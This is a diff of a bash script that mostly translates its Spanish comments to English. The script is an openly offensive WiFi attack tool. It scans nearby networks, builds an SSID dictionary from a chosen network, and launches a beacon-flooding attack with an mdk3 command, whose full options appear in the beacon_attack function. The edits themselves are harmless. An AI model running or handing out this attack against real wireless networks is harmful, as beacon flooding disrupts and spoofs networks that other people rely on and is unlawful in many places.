@@ -1,17 +1,15 @@
 #!/bin/bash
 # Author: 0xJuaNc4
 
-# Paleta de colores ANSI
+# ANSI color palette
 GREEN="\e[1;92m"
 RED="\e[1;91m"
 YELLOW="\e[1;93m"
 CYAN="\e[1;96m"
 RESET="\e[1;97m"
 
-# Limpiar consola
-clear
 
-# Función salir del script
+# Exit function
 trap ctrl_c INT
 stty -ctlecho
 function ctrl_c(){
@@ -26,6 +24,7 @@ function ctrl_c(){
 
 # Banner
 banner(){
+    clear
     echo -e "${GREEN}┏━━┓╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┏━━┓╋╋╋╋╋╋╋╋┏┓"
     echo -e "┃┏┓┃╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋┃┏┓┃╋╋╋╋╋╋╋┏┛┗┓"
     echo -e "┃┗┛┗┳━━┳━━┳━━┳━━┳━┓┃┗┛┗┳┓┏┳━┳━┻┓┏┛"
@@ -50,7 +49,7 @@ check_tools(){
     done
 }
 
-# Listar interfaces de red disponibles
+# List available network interfaces
 select_interface(){
     echo -e "\n${CYAN}[*]${RESET} Comenzando...\n"
     sleep 1
@@ -78,7 +77,7 @@ select_interface(){
     fi
 }
 
-# Mostrar la tabla del escaneo de redes
+# Display the network scan table
 show_table(){
     clear
     banner
@@ -95,7 +94,7 @@ show_table(){
     echo -e "--------------------------------------------------------------"
 }
 
-# Escanear las redes WIFI
+# Scanning WIFI networks
 net_scan(){
     echo -n -e "\n${CYAN}¿Deseas continuar con el escaneo de redes? ${YELLOW}(s/n)${RESET} >${RESET} "
     read option_choose
@@ -125,7 +124,7 @@ net_scan(){
     fi
 }
 
-# Realizar ataque Beacon Flooding
+# Perform Beacon Flooding attack
 beacon_attack(){
     selected_channel=$(grep "$selected_essid" output-01.csv | awk -F "," '{print $4}')
     echo -e "\n${CYAN}[*]${RESET} Creando diccionario de ataque para la red ${YELLOW}$selected_essid${RESET}\n"
@@ -140,7 +139,7 @@ beacon_attack(){
     mdk3 $interface b -f ssid_dict.txt -c $selected_channel -s 1000 -a
 }
 
-# Programa principal
+# Main program
 if [ "$(id -u)" == "0" ]; then
     banner
     check_tools
